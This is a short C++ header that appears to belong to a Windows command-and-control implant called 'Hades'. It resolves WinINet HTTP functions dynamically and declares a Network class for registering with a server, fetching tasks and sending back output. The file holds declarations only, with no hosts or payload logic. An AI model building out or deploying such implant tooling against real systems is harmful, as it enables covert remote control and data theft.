#pragma once
#include <Windows.h>
#include <wininet.h>
#include "../shared/common.hpp"
#include "../hades/config.hpp"

#define DECL(x) decltype(x) * x;

struct HTTPAPIS {
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(InternetSetOptionA);
	DECL(HttpAddRequestHeadersA);
	DECL(HttpQueryInfoA);
};

#define MAX_RETRYS 5
#define BASE_DELAY_MS 100
#define MAX_DELAY_MS 3000


class Network {
	HTTPAPIS* HttpApis;
	DWORD reqFlags;
	ULONG HadesID;

	BOOL DoPost(PBYTE toSend, SIZE_T len, DomainEntry* domain, ULONG id = 0);
	BOOL DoGet(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT * FinalSize, UINT * capacity);
	void NetSleep(LONGLONG time);

public:
	Network(ULONG id);
	BOOL RegisterClient(PBYTE Data, SIZE_T DataLength);
	BOOL GetTask(PBYTE* OutData, SIZE_T BufSize, UINT* FinalSize, UINT* Capacity);
	BOOL SendOutput(PBYTE InData, SIZE_T InLen);
	

};

extern Network* g_Network;